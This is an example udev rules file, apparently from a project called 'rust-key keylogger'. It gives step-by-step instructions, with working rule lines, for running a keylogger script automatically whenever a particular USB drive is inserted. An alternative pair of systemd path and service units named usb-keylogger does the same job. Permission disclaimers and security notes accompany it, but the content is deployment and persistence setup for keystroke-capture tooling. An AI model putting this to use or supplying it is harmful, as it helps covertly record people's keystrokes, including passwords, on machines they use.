# 99-usb-autorun.rules.example
# Example udev rule for USB auto-execution of rust-key keylogger
# ⚠️  WARNING: Automatic execution has security implications!
# Only use this on systems you own or have explicit permission to configure.

# SETUP INSTRUCTIONS:
# ====================
# 1. Find your USB drive's vendor and product ID:
#    lsusb
#    Output will show something like: Bus 001 Device 005: ID 1234:5678 Vendor Name
#    Where 1234 is the vendor ID and 5678 is the product ID
#
# 2. Find where your USB drive typically mounts:
#    - Modern systems: /media/$USER/VOLUME_NAME or /run/media/$USER/VOLUME_NAME
#    - Replace $USER with your actual username
#    - Replace VOLUME_NAME with your USB drive's volume label
#    Example: /run/media/john/RUSTKEYUSB
#
# 3. Edit the rule below with your values
#
# 4. Copy this file to the udev rules directory:
#    sudo cp 99-usb-autorun.rules.example /etc/udev/rules.d/99-usb-autorun.rules
#    sudo nano /etc/udev/rules.d/99-usb-autorun.rules  # Edit with your values
#
# 5. Reload udev rules:
#    sudo udevadm control --reload-rules
#    sudo udevadm trigger

# EXAMPLE RULE (edit with your actual values):
# Replace:
#   - XXXX with your USB vendor ID
#   - YYYY with your USB product ID  
#   - /path/to/usb/mount with your actual USB mount path
#   - username with your actual username
#
# ACTION=="add", SUBSYSTEM=="block", ATTRS{idVendor}=="XXXX", ATTRS{idProduct}=="YYYY", RUN+="/bin/su username -c '/path/to/usb/mount/usb_autorun.sh'"

# ALTERNATIVE: Run based on mount point label
# This triggers when a specific volume label is mounted
# Replace VOLUME_LABEL with your USB drive's label and adjust the path
# Note: Complex quoting in udev rules can be error-prone. Consider creating a wrapper script:
#   1. Create /usr/local/bin/run-usb-keylogger.sh with your command
#   2. Make it executable: chmod +x /usr/local/bin/run-usb-keylogger.sh
#   3. Use the simpler rule: ACTION=="add", SUBSYSTEM=="block", ENV{ID_FS_LABEL}=="VOLUME_LABEL", RUN+="/usr/local/bin/run-usb-keylogger.sh"
#
# ACTION=="add", SUBSYSTEM=="block", ENV{ID_FS_LABEL}=="VOLUME_LABEL", RUN+="/bin/bash -c 'sleep 2 && /bin/su username -c \"/run/media/username/VOLUME_LABEL/usb_autorun.sh\"'"

# SECURITY NOTES:
# ================
# - Automatic script execution from removable media is a security risk
# - Most modern Linux distributions block this by default for good reason
# - Only enable if you understand the security implications
# - Consider using a systemd service instead for better control
# - Always verify the script source before enabling auto-execution

# DEBUGGING:
# ==========
# To test if your rule is working:
# 1. Check udev rule syntax:
#    sudo udevadm test /sys/block/sdb (replace sdb with your device)
#
# 2. Monitor udev events:
#    sudo udevadm monitor --environment --udev
#
# 3. Check system logs:
#    sudo journalctl -f
#    (then plug in your USB drive)

# ALTERNATIVE SETUP: Using systemd path unit (recommended for better control)
# ============================================================================
# Instead of udev, you can use systemd to monitor a mount point:
#
# 1. Create /etc/systemd/system/usb-keylogger.path:
#    [Unit]
#    Description=Monitor USB mount for keylogger
#    
#    [Path]
#    PathExists=/run/media/username/VOLUME_LABEL/usb_autorun.sh
#    
#    [Install]
#    WantedBy=multi-user.target
#
# 2. Create /etc/systemd/system/usb-keylogger.service:
#    [Unit]
#    Description=USB Keylogger Auto-run
#    
#    [Service]
#    Type=oneshot
#    User=username
#    ExecStart=/bin/bash /run/media/username/VOLUME_LABEL/usb_autorun.sh
#    
# 3. Enable the path unit:
#    sudo systemctl enable usb-keylogger.path
#    sudo systemctl start usb-keylogger.path
